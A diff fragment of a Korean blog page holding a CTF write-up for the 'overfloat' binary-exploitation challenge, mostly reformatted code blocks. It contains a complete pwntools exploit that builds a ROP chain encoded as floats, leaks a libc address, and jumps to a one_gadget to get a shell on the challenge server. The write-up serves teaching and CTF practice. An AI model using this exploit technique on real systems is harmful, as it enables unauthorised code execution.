+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(overfloat<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>stdin <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(overfloat<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>puts)</span></span></code></pre></div>
 <p>하지만 overfloat 바이너리는 float형으로 메모리를 덮는다는 사실!</p>
-
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">float</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v2 <span style="color:#f92672">=</span> atof(<span style="color:#f92672">&amp;</span>s);
-    v4 <span style="color:#f92672">=</span> v2;
-    memset(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x64uLL</span>);
-    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">4LL</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> a1) <span style="color:#f92672">=</span> v4;</code></pre></div>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">float</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v2 <span style="color:#f92672">=</span> atof(<span style="color:#f92672">&amp;</span>s);
+</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> v2;
+</span></span><span style="display:flex;"><span>    memset(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x64uLL</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">4LL</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> a1) <span style="color:#f92672">=</span> v4;</span></span></code></pre></div>
 <p>위 코드의 atof 함수가 바로 그 녀석이죠.
 그럼 저희는 모았던 가젯을 float형으로 변환해야 합니다.</p>
-
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;</span> u <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: str(struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&lt;f&#39;</span>, p32(x))[<span style="color:#ae81ff">0</span>])
-<span style="color:#f92672">&gt;&gt;&gt;</span> u(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address)
-<span style="color:#e6db74">&#39;5.88124264828e-39&#39;</span>
-<span style="color:#f92672">&gt;&gt;&gt;</span> u(overfloat<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>stdin <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
-<span style="color:#e6db74">&#39;8.82789025646e-39&#39;</span>
-<span style="color:#f92672">&gt;&gt;&gt;</span> u(overfloat<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>puts)
-<span style="color:#e6db74">&#39;5.87982593553e-39&#39;</span></code></pre></div>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> u <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: str(struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&lt;f&#39;</span>, p32(x))[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> u(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;5.88124264828e-39&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> u(overfloat<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>stdin <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;8.82789025646e-39&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> u(overfloat<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>puts)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;5.87982593553e-39&#39;</span></span></span></code></pre></div>
 <p>위와 같이 변환해서 보내게 되면 메모리에는 우리가 원하는 가젯의 주소가 들어가게 될 것입니다.</p>
-
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address))
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(overfloat<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>stdin <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>))
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(overfloat<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>puts))
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)</code></pre></div>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(overfloat<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>stdin <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(overfloat<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>puts))
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)</span></span></code></pre></div>
 <h1 id="익스-코드">익스 코드</h1>
-
-<hr />
-
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-
-u <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: str(struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&lt;f&#39;</span>, p32(x))[<span style="color:#ae81ff">0</span>])
-
-overfloat <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./overfloat&#39;</span>, False)
-libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.27.so&#39;</span>, False)
-rop <span style="color:#f92672">=</span> ROP(overfloat)
-
-r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;challenges.fbctf.com&#39;</span>, <span style="color:#ae81ff">1341</span>)
-
-p <span style="color:#f92672">=</span> log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#39;&#39;</span>)
-<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">14</span>):
-    p<span style="color:#f92672">.</span>status(str(_))
-    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(_))
-
-p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;pop rdi ; ret&#39;</span>)
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address))
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
-
-p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;stdin@got + 1&#39;</span>)
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(overfloat<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>stdin <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>))
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
-
-p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;puts@plt&#39;</span>)
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(overfloat<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>puts))
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
-
-p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;main@.text&#39;</span>)
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(overfloat<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main))
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
-
-p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;1st done&#39;</span>)
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;done&#39;</span>)
-r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-
-p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;libc leak&#39;</span>)
-LEAK <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
-LEAK <span style="color:#f92672">=</span> LEAK<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
-LEAK <span style="color:#f92672">=</span> u64(LEAK)
-libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> LEAK <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_IO_2_1_stdin_
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;libc: {:#x}&#39;</span><span style="color:#f92672">.</span>format(libc<span style="color:#f92672">.</span>address))
-
-<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">14</span>):
-    p<span style="color:#f92672">.</span>status(str(_))
-    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(_))
-
-p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;one_gadget&#39;</span>)
-one_gadget <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4f2c5</span>
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(one_gadget <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>))
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(one_gadget <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
-
-p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;2nd done&#39;</span>)
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;done&#39;</span>)
-r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;cat /home/overfloat/flag&#39;</span>)
-p<span style="color:#f92672">.</span>success()
-r<span style="color:#f92672">.</span>interactive()</code></pre></div>
-
-<p>참고<br />
-Online Converter : <a href="https://www.binaryconvert.com/convert_float.html" target="_blank">https://www.binaryconvert.com/convert_float.html</a><br />
-Python Converting Code : <a href="https://stackoverflow.com/questions/1592158/convert-hex-to-float#answer-1592362" target="_blank">https://stackoverflow.com/questions/1592158/convert-hex-to-float#answer-1592362</a><br />
-Python2 struct module : <a href="https://docs.python.org/2/library/struct.html" target="_blank">https://docs.python.org/2/library/struct.html</a><br />
-Python3 struct module : <a href="https://docs.python.org/3/library/struct.html" target="_blank">https://docs.python.org/3/library/struct.html</a></p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>u <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: str(struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&lt;f&#39;</span>, p32(x))[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>overfloat <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./overfloat&#39;</span>, <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.27.so&#39;</span>, <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(overfloat)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;challenges.fbctf.com&#39;</span>, <span style="color:#ae81ff">1341</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">14</span>):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>status(str(_))
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(_))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;pop rdi ; ret&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;stdin@got + 1&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(overfloat<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>stdin <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;puts@plt&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(overfloat<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>puts))
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;main@.text&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(overfloat<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main))
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;1st done&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;done&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;libc leak&#39;</span>)
+</span></span><span style="display:flex;"><span>LEAK <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>LEAK <span style="color:#f92672">=</span> LEAK<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>LEAK <span style="color:#f92672">=</span> u64(LEAK)
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> LEAK <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_IO_2_1_stdin_
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;libc: </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">14</span>):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>status(str(_))
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, str(_))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;one_gadget&#39;</span>)
+</span></span><span style="display:flex;"><span>one_gadget <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4f2c5</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(one_gadget <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>))
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, u(one_gadget <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;2nd done&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">&#39;done&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;cat /home/overfloat/flag&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>success()
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()</span></span></code></pre></div>
+<p>참고<br>
+Online Converter : <a href="https://www.binaryconvert.com/convert_float.html">https://www.binaryconvert.com/convert_float.html</a><br>
+Python Converting Code : <a href="https://stackoverflow.com/questions/1592158/convert-hex-to-float#answer-1592362">https://stackoverflow.com/questions/1592158/convert-hex-to-float#answer-1592362</a><br>
+Python2 struct module : <a href="https://docs.python.org/2/library/struct.html">https://docs.python.org/2/library/struct.html</a><br>
+Python3 struct module : <a href="https://docs.python.org/3/library/struct.html">https://docs.python.org/3/library/struct.html</a></p>
 
     </div>
 
@@ -978,7 +937,7 @@ Python3 struct module : <a href="https://docs.python.org/3/library/struct.html" 
 <section id="comments">
   <div id="disqus_thread"></div>
 <script type="application/javascript">
-    var disqus_config = function () {
+    window.disqus_config = function () {
     
     
     
@@ -1097,7 +1056,7 @@ Python3 struct module : <a href="https://docs.python.org/3/library/struct.html" 
     
     
     
-    <script src="/js/academic.min.55cec13bc0aa6adeb045a602375e60b9.js"></script>
+    <script src="/js/academic.min.60fe6a17da6f5e53d33cccef2fb2e256.js"></script>
 
     
 
@@ -1112,7 +1071,7 @@ Python3 struct module : <a href="https://docs.python.org/3/library/struct.html" 
   
 
   <p class="powered-by">
-    &copy; 2021 j3rrry &middot; 
+    © 2022 j3rrry &middot; 
 
     Powered by the
     <a href="https://sourcethemes.com/academic/" target="_blank" rel="noopener">Academic theme</a> for
